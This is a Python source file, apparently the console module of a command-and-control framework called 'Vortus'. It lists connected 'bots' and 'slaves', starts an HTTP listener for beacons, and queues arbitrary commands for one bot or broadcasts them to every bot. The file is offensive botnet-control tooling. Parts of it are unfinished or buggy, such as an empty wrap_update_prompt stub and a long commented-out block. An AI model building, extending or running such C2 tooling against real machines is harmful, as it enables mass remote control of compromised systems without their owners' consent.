import threading
import time
import urwid
import json
import re

from core import logger
from core.config import ServerConfig
from core.utils import wrap_response
from core.autocomplete import AutoComplete
from core.server import ServerThread
from core.utils import get_prompt_text
from data.state import VortusState
from functools import partial

logger = logger.get_logger(__name__)

COMMANDS = {}
RANDOM_ACCESS_VARS = {}

class CommandHandler(object):
    """
    This class is responsible for defining the business logic of each command.
    """
    class C2Command(object):
        """
        This is a decorator to bind commands to a function
        """
        def __init__(self, command_path=[]):
            self.command_path = command_path

        def __call__(self, fn):

            def back_fn(obj):
                self.command_path.pop()
                obj._interface_footer.set_caption(
                        get_prompt_text(self.command_path))

            # The code below binds the function with the @C2Command decorator
            # to the COMMANDS dictionary. If path does not exist already in the
            # dictionary, is created on the fly.
            command_family = self.walk_command_path()
            command_family[fn.__name__] = fn

            # This is called only when the function is called by self. so it
            # is here only for clarity purposes.
            def wrapper(obj_instance, *args):
                fn(obj_instance, args)
            return wrapper

        def walk_command_path(self):
            global COMMANDS
            command_family = COMMANDS
            for command in self.command_path:
                next_cmd = command_family.get(command)
                if next_cmd == None:
                    next_cmd = {}
                    command_family[command] = next_cmd
                command_family = next_cmd
            return command_family

    class GlobalC2Command(C2Command):
        """
        This is a decorator to bind global commands that can be run irrespectively
        from the current command path to a function
        """
        def __init__(self, fn):
            global COMMANDS
            self.bind_to_all(COMMANDS, fn)
        
        def __call__(self):
            pass
    
        def bind_to_all(self, cmd_dict, fn):
            def wrap_func(original_fn, *args, **kwargs):
                wrapped_result = original_fn(*args, **kwargs)
                for k in wrapped_result:
                    wrapped_result[k][fn.__name__] = fn
                return wrapped_result

            for k, v in cmd_dict.items():
                if isinstance(v, dict):
                    self.bind_to_all(v, fn)
                    v[fn.__name__] = fn
                    if "__choice_fn__" in v:
                        v["__choice_fn__"] = partial(wrap_func, v["__choice_fn__"])
                    
    class ChoiceC2Command(C2Command):
        """
        This is a decorator to bind commands to a function
        """
        def __init__(self, command_path=[]):
            self.command_path = command_path

        def __call__(self, fn):
            
            # The code below binds the function with the @C2Command decorator
            # to the COMMANDS dictionary. If path does not exist already in the
            # dictionary, is created on the fly.
            command_family = self.walk_command_path()
            command_family["__choice_fn__"] = fn
            
            # This is called only when the function is called by self. so it
            # is here only for clarity purposes.
            def wrapper(obj_instance, *args):
                fn(obj_instance, args)
            return wrapper

        def wrap_update_prompt(fn):
            def wrapped_func(*args, **kwrags):
                global COMMANDS

    class RegExC2Command(C2Command):
        """
        This decorator binds commands that match a specified regex
        """
        def __init__(self, regex, command_path=[]):
            self.command_path = command_path
            self.regex = re.compile(regex)

        def __call__(self, fn):
            command_family = self.walk_command_path()
            command_family["__regex__"] = self.regex
            command_family["__regex_fn__"] = fn
            
            # This is called only when the function is called by self. so it
            # is here only for clarity purposes.
            def wrapper(obj_instance, *args):
                fn(obj_instance, args)
            return wrapper

    class RegExChoiceActionC2Command(RegExC2Command):
        """
        This decorator binds commands that match a specified regex
        """
        def __init__(self, regex, command_path=[]):
            self.command_path = command_path
            self.regex = re.compile(regex)

        def __call__(self, fn):
            command_family = self.walk_command_path()
            command_family["__regex__"] = self.regex
            command_family["__regex_fn__"] = fn
            
            # This is called only when the function is called by self. so it
            # is here only for clarity purposes.
            def wrapper(obj_instance, *args):
                fn(obj_instance, args)
            return wrapper


    def __init__(self, mqs, slave2beacon, rq):
        self.message_queues = mqs
        self.slave2beacon = slave2beacon
        self.response_queue = rq
        self.commands = {}
        self._interface_footer = None
        self.current_command_path = []

    @C2Command(command_path=["sessions"])
    def bots(self):
        self.response_queue.put(wrap_response("SYSTEM", self.active_bots()))

    @C2Command(command_path=["listeners"])
    def start_http(self, host, port):
        #Start Server Thread
        server_thread = ServerThread(host, int(port), self.message_queues, self.response_queue,
                                     self.slave2beacon)
        server_thread.start()

    @ChoiceC2Command(command_path=["sessions", "slave"])
    def slave_choices(self):
        choices = {}
        for slave in self.slave2beacon.keys():
            print()
            choices[str(slave)] = {}
        return choices

    # @RegExChoiceActionC2Command(command_path=["sessions", "slave"], regex="(.*?)")
    # def on_slave_command(self, slave):
    #     pass



    @RegExC2Command(regex="(.*?)", command_path=["sessions", "all"])
    def mass_command(self, cmd, *args):
        full_cmd = " ".join(args + [cmd])
        logger.debug('Queuing command "{0}" for all bots'.format(full_cmd))
        wrapped_command = json.dumps({"to": "all", "cmd": full_cmd})
        for i in range(self.number_of_beacons()):
            self.message_queues["all"].put(wrapped_command)

    @C2Command(command_path=["sessions", "slave"])
    def help(self):
        help_text  = "[+] Select a slave to interact with:\n" + self.active_bots()
        self.response_queue.put(wrap_response("SYSTEM", help_text))

    @GlobalC2Command
    def back(self):
        self.current_command_path.pop()
        self._interface_footer.set_caption(
                get_prompt_text(self.current_command_path))

    @property
    def interface_footer(self):
        return self._interface_footer
    
    @interface_footer.setter
    def interface_footer(self, interface_footer):
        self._interface_footer = interface_footer

    def unknown_command(self, cmd):
        self.response_queue.put(wrap_response("SYSTEM", "Unknown command: {}".format(cmd)))
    
    def get_into(self, cmd):        
        self.current_command_path.append(cmd)
        self._interface_footer.set_caption(get_prompt_text(self.current_command_path))

    def number_of_bots(self):
        return sum([1 for slave in self.slave2beacon.keys()])

    def number_of_beacons(self):
        return sum([1 for addr in self.message_queues.keys() if addr is not "all"])

    def active_bots(self):
        if self.number_of_bots() > 0:
            response = "[+] Active Bots:\n"
            response += "\n".join(["{0}) {1}"
                        .format(idx+1, ServerConfig.UI_BOT_IDENTIFIER(slave)) for idx, slave in enumerate(self.slave2beacon.keys())])
        else:
            response = "[+] There are not any active bots"
        return response

    def handle_command(self, cmd):
        # logger.debug(COMMANDS)
        logger.debug("Command and Control: Typed command: {0}".format(cmd))
        # Argument Parsing
        args = []
        parts = cmd.strip().split(" ")
        if len(parts) == 1:
            cmd = cmd.strip()
        else:
            cmd = parts[0].strip()
            args = parts[1:]

        command_family = COMMANDS
        for c in self.current_command_path:
            command_family = command_family[c]
            if "__choice_fn__" in command_family:
                command_family = {**command_family, **command_family["__choice_fn__"](self)}
        logger.debug("Searching for command in: {0}".format(command_family))
        command_fn = command_family.get(cmd)
        if isinstance(command_fn, dict):
            self.get_into(cmd)
        elif command_fn is None:
            if command_family.get("__regex__"):
                command_fn = command_family.get("__regex_fn__")
                if command_family.get("__regex__").match(cmd):
                    command_fn(self, cmd, *args)
                else:
                    self.unknown_command(cmd)
            else:
                self.unknown_command(cmd)
        else:
            command_fn(self, *args)
        
        # if prompt == "Sessions >":
        #     if cmd == "bots" or cmd == "b":
        #         self.response_queue.put(wrap_response("SYSTEM", self.active_bots()))
        #     elif cmd == "interact" or cmd == "i":
        #         self._interface_footer.set_caption("Select Slave >")
        #     elif cmd == "mass" or cmd == "m":
        #         self._interface_footer.set_caption("All >")
        #     elif cmd == "":
        #         pass
        #     else:
        #         self.response_queue.put(wrap_response("SYSTEM", "Unknown command: {}".format(cmd)))
        # elif prompt == "Vortus >":
        #     if cmd == "skata":
        #         COMMANDS[cmd](self, "test")
        # elif prompt == "Select Slave >":
        #     if cmd == "back" or cmd is "b":
        #         self._interface_footer.set_caption(" >")
        #     else:
        #         try:
        #             slave_num = int(cmd)
        #             self.recipient = list(self.slave2beacon.keys())[slave_num-1]
        #             bot_prompt = ServerConfig.UI_BOT_IDENTIFIER(self.recipient)
        #             self._interface_footer.set_caption("{0} >".format(bot_prompt))
        #         except (ValueError, IndexError):
        #             response = "Please select a number from the bot list:\n" + self.active_bots()
        #             self.response_queue.put(wrap_response("SYSTEM", response))
        # elif prompt == "All >":
        #     if cmd == "back" or cmd is "b":
        #         self._interface_footer.set_caption(" >")
        #     else:
        #         logger.debug('Queuing command "{0}" for all bots'.format(cmd))
        #         wrapped_command = json.dumps({"to": "all", "cmd": cmd})
        #         for i in range(self.number_of_beacons()):
        #             self.message_queues["all"].put(wrapped_command)
        # else:   # This means prompt point to individual bot
        #     if cmd == "back" or cmd is "b":
        #         self._interface_footer.set_caption("Select Slave >")
        #     else:
        #         logger.debug('Queuing command "{0}" for {1}'.format(cmd, self.slave2beacon[self.recipient]))
        #         wrapped_command = json.dumps({"to": self.recipient.mac_addr, "cmd": cmd})
        #         self.message_queues[self.slave2beacon[self.recipient]].put(wrapped_command)
            